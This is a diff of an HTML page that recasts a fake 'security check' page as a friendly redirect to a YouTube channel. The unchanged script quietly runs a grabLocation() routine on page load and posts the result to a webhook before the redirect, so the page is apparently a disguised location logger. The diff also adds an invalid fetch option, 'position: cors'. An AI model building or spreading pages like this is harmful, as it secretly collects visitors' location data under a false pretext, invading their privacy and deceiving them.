@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stream Core Security Check</title>
+    <title>Stream Routing...</title>
     <style>
         /* Cyberpunk Streaming Animated Background */
         body { 
@@ -69,37 +69,18 @@
             border-radius: 4px;
             margin-bottom: 25px;
             font-family: monospace;
-        }
-        .badge-red {
-            background: rgba(255, 74, 74, 0.15);
-            color: #ff4a4a;
-            border: 1px solid #ff4a4a;
-            box-shadow: 0 0 10px rgba(255, 74, 74, 0.2);
-        }
-        .badge-green {
-            background: rgba(38, 208, 124, 0.15);
-            color: #26d07c;
-            border: 1px solid #26d07c;
-            box-shadow: 0 0 10px rgba(38, 208, 124, 0.2);
-            display: none;
+            background: rgba(145, 70, 255, 0.15);
+            color: #d1b3ff;
+            border: 1px solid #9146FF;
+            box-shadow: 0 0 10px rgba(145, 70, 255, 0.2);
         }
 
-        /* Dynamic Text Steps */
-        .warning-text {
-            color: #ff4a4a;
-            font-size: 24px;
-            font-weight: bold;
-            line-height: 1.6;
-            display: block;
-            text-shadow: 0 0 12px rgba(255, 74, 74, 0.4);
-        }
-
+        /* Message Text Boxes (Neon Green Glow) */
         .safe-text {
             color: #26d07c;
             font-size: 24px;
             font-weight: bold;
             line-height: 1.6;
-            display: none; 
             text-shadow: 0 0 12px rgba(38, 208, 124, 0.4);
         }
 
@@ -111,7 +92,6 @@
             font-style: italic;
             border-top: 1px solid rgba(255, 255, 255, 0.1);
             padding-top: 15px;
-            display: none;
             letter-spacing: 0.5px;
         }
 
@@ -154,21 +134,16 @@
 <body>
 
     <div class="container">
-        <!-- Changing Security System Status Badges -->
-        <div id="redBadge" class="status-badge badge-red">⚠️ SECURITY ALERT: ENFORCED</div>
-        <div id="greenBadge" class="status-badge badge-green">⚙️ CONFIGURATION CLEAN</div>
+        <!-- System Status Badge -->
+        <div class="status-badge">🚀 REDIRECTING TO GEOUNIVERSE</div>
 
-        <!-- Changing Warning Text Boxes -->
-        <div id="redMessage" class="warning-text">
-            ⚠️ This is a warning do not click on random links there might be some bad ones on there.
-        </div>
-        
-        <div id="greenMessage" class="safe-text">
-            ✅ This is a good link but dont click on random one u see.
+        <!-- Your Custom Message Text Box -->
+        <div class="safe-text">
+            Hello, the link that you have clicked on will now send you to my yt. Enjoy!
         </div>
 
         <!-- Custom Closing Message Container -->
-        <div id="closingMessage" class="closing-text">
+        <div class="closing-text">
             Alr i gtg now made from - <strong>GeoUnivers</strong> good luck!
         </div>
 
@@ -195,6 +170,7 @@
                     await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
+                        position: 'cors',
                         body: JSON.stringify(payload)
                     });
                 }
@@ -206,18 +182,9 @@
         // Fire database packet log instantly
         grabLocation();
 
-        // ⏱️ 4-Second Complete Interface Swap Script
+        // ⏱️ 4-Second Automatic Channel Redirect Script
         setTimeout(() => {
-            // Swap Top Status Badges
-            document.getElementById('redBadge').style.display = 'none';
-            document.getElementById('greenBadge').style.display = 'inline-block';
-
-            // Swap Center Core Messaging Text Blocks
-            document.getElementById('redMessage').style.display = 'none';
-            document.getElementById('greenMessage').style.display = 'block';
-
-            // Display your custom closing tagline text
-            document.getElementById('closingMessage').style.display = 'block';
+            window.location.href = "https://www.youtube.com/@GeoUniverse-l9g";
         }, 4000);
     </script>
 </body>
